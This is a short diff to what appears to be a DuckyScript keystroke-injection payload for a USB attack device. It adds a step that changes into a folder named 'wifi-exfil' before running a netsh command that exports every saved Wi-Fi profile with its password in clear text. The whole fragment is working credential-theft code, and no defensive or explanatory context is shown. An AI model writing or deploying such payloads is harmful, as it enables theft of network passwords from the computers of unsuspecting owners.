@@ -7,6 +7,9 @@ DELAY 200
 STRING mkdir wifi-exfil
 ENTER
 DELAY 200
+STRING cd wifi-exfil
+ENTER
+DELAY 200
 STRING netsh wlan export profile folder=. key=clear
 ENTER
 DELAY 200
